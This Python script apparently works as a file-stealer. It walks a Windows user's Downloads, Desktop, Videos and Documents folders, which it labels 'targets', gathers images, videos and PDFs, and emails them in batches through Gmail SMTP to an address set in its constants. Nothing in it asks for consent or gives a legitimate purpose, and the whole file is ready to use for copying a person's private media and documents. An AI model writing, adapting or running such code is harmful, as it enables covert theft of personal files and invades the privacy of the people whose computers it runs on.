import os
import sys
import smtplib
import time
import mimetypes
from email.message import EmailMessage

#______________________________________________const__________________________________________
arr_of_targets = ["Downloads", "Desktop", "Videos", "Documents" ]
max_size = 17_825_000
usernm = os.getlogin()
subject = "Tyler"
email_address = "******@gmail.com"#your email
email_password = "**** **** **** ****"#password
to_address = "******@gmail.com"#your email
allowed_extensions = [".jpeg", ".jpg", ".pdf", ".png", ".mp4", ".mkv", ".avi", ".mov", ".wmv",
    ".flv", ".webm", ".m4v", ".3gp", ".ts", ".docs"]#you can add or delete extencions you want
#__________________________________________end_const_________________________________________

def process_and_send_files(usernm, folder, allowed_extensions, max_size,
                           email_address, email_password, to_address,
                           send_files_email):
    base_path = f"C:\\Users\\{usernm}\\{folder}"
    if not os.path.exists(base_path):
        print(f"📁 Not Found: {base_path}")
        return

    for current_path, dirs, files_in_dir in os.walk(base_path):
        print(f"\n📂 We are in: {current_path}")

        files = [f for f in files_in_dir if os.path.splitext(f)[1].lower() in allowed_extensions]

        if files:
            print("🗂 Were Found:")
            for f in files:
                print(f" - {f}")
        else:
            print("⚠️ Nothing interesting.")
            continue

        curr_files = []
        curr_size = 0

        for file in files:
            file_path = os.path.join(current_path, file)
            file_size = os.path.getsize(file_path)
            if file_size > max_size:
                print(f"⚠️ {file} too big, skip")
                continue
            if curr_size + file_size > max_size:
                send_files_email(email_address, email_password, to_address, curr_files, current_path)
                curr_files = []
                curr_size = 0

            curr_files.append(file_path)
            curr_size += file_size

        if curr_files:
            send_files_email(email_address, email_password, to_address, curr_files, current_path)

def send_files_email(email_address, email_password, to_address, files, current_path):
    msg = EmailMessage()
    msg["Subject"] = subject
    msg["From"] = email_address
    msg["To"] = to_address
    msg.set_content(f"Files from: {current_path}")

    for file_path in files:
        with open(file_path, "rb") as f:
            file_data = f.read()
            mime_type, _ = mimetypes.guess_type(file_path)
            if mime_type is None:
                mime_type = 'application/octet-stream'
            maintype, subtype = mime_type.split('/', 1)

            file_name = os.path.basename(file_path)

            msg.add_attachment(file_data, maintype=maintype, subtype=subtype, filename=file_name)

    try:
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
            smtp.login(email_address, email_password)
            smtp.send_message(msg)
        print(f"✅ Sended {len(files)} files from {current_path}")
    except smtplib.SMTPException as e:
        print(f"Mistake: {e}")
        time.sleep(5)

#______________________main___________________________
for folder in arr_of_targets:
    process_and_send_files(usernm, folder, allowed_extensions, max_size,
                           email_address, email_password, to_address, send_files_email)


